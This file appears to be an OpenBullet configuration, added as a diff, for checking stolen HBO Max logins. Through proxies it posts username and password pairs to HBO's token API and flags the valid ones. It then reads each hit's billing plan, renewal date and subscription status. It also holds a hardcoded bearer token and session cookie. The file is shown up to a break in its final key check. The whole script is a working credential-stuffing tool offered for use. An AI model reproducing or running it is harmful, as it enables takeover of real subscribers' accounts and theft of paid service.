@@ -1,0 +1,123 @@
+[SETTINGS]
+{
+  "Name": "HBO MAX API",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-21T15:31:12.0046389+00:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://comet.api.hbo.com/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.7.2.206 android/50.7.2.206 (A5010/7.1.2)" 
+  HEADER "X-B3-TraceId: 006f26d0-7742-4e22-bd0a-d93a5a0cd90e-96151881-e9b4-4fd4-8a1b-9374e88300ce" 
+  HEADER "If-None-Match: W/\"ace-QrO0rQox4omI4xY6m5bi6w\"" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Os-Version: 7.1.2" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aW1lc3RhbXAiOjE2MDgzNjIwMzIzNTgsImV4cGlyYXRpb24iOjE2MDgzNzY0MzIzNTgsInBheWxvYWQiOnsiaGlzdG9yaWNhbE1ldGFkYXRhIjp7Im9yaWdpbmFsSXNzdWVkVGltZXN0YW1wIjoxNjA4MzYyMDMyMzU3LCJvcmlnaW5hbEdyYW50VHlwZSI6ImNsaWVudF9jcmVkZW50aWFscyIsIm9yaWdpbmFsVmVyc2lvbiI6Mn0sImV4cGlyYXRpb25NZXRhZGF0YSI6eyJhdXRoelRpbWVvdXRNcyI6MTQ0MDAwMDAsImF1dGhuVGltZW91dE1zIjozMTEwNDAwMDAwMCwiYXV0aHpFeHBpcmF0aW9uVXRjIjoxNjA4Mzc2NDMyMzU4LCJhdXRobkV4cGlyYXRpb25VdGMiOjE2Mzk0NjYwMzIzNTh9LCJ0b2tlblByb3BlcnR5RGF0YSI6eyJjbGllbnRJZCI6IjcxNjFhZmY2LTE4OGEtNDcxOC04ZDM1LTY5YzZhZTU4ODg0ZiIsImRldmljZVNlcmlhbE51bWJlciI6IjVjYmI3MmNiLTE0YTUtNGY1NC05OGRjLWFmZWU4NjFjZTdlNCIsInBlcm1pc3Npb25zIjpbNSw3LDldLCJjb3VudHJ5Q29kZSI6IlVTIiwicGxhdGZvcm1UZW5hbnRDb2RlIjoiaGJvRGlyZWN0IiwicHJvZHVjdENvZGUiOiJoYm9NYXgiLCJkZXZpY2VDb2RlIjoiYW5kcm9pZCIsInBsYXRmb3JtVHlwZSI6Im1vYmlsZSIsInNlcnZpY2VDb2RlIjoiSEJPX01BWCIsImNsaWVudERldmljZURhdGEiOnsicGF5bWVudFByb3ZpZGVyQ29kZSI6Imdvb2dsZS1wbGF5In19LCJjdXJyZW50TWV0YWRhdGEiOnsiZW52aXJvbm1lbnQiOiJwcm9kdWN0aW9uIiwidmVyc2lvbiI6Miwibm9uY2UiOiJmODUxOGI2YS1hMWRjLTQ1ODItYjRhOC0xMzZhMzVkZDA0MTciLCJpc3N1ZWRUaW1lc3RhbXAiOjE2MDgzNjIwMzIzNTh9LCJwZXJtaXNzaW9ucyI6WzUsNyw5XSwidG9rZW5fdHlwZSI6ImFjY2VzcyIsImVudmlyb25tZW50IjoicHJvZHVjdGlvbiIsInZlcnNpb24iOjJ9fQ.Jv_t1BHbNWQ8ODXBi43CRnYHg69XUAQyalARZZTJKks" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 152" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+    KEY "invalid_credentials" 
+    KEY "code" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:billing-status:mine\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "x-hbo-brownie: sessionContext=yKiiicnk6JpeZf6skFHWbQ%3D%3D.zQKZY4DVpiItuONHUNaOucC3%2F4WNBBCHJwkMA3QnwHGY4yRz8R%2BK5urgq4okN3OMQBlgIXaUvlERsO05AWqXZGJWK4nkWKWROC1DBAnEIYlDRNNvNy%2BrukXc7yxGs8ePdKnXeAf%2FjNsk5CU1IeFqkA%3D%3D" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.7.2.206 android/50.7.2.206 (A5010/7.1.2)" 
+  HEADER "X-B3-TraceId: 006f26d0-7742-4e22-bd0a-d93a5a0cd90e-44b2e4ed-e41d-406d-d263-81c4c81078eb" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Os-Version: 7.1.2" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 38" 
+
+IF "<SOURCE>" Contains "Billing Date"
+
+PARSE "<SOURCE>" LR "nPrice: [" "](strong" CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "Billing Date: [" "T" -> VAR "ex" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<ex>" -> VAR "ut" 
+
+FUNCTION UnixTimeToDate "dd-MM-yyyy" 
+
+PARSE "<SOURCE>" JSON "autoRenew" CreateEmpty=FALSE -> CAP "Auto-Renew" 
+
+ELSE
+
+PARSE "<SOURCE>" LR "\"billingInformationMessage\": \"" "." CreateEmpty=FALSE -> CAP "Billing Info" 
+
+ENDIF
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Your subscription expired on " 
+    KEY "<Billing Info>" Contains "expired" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You’re not subscribed to HBO Max" 
+  
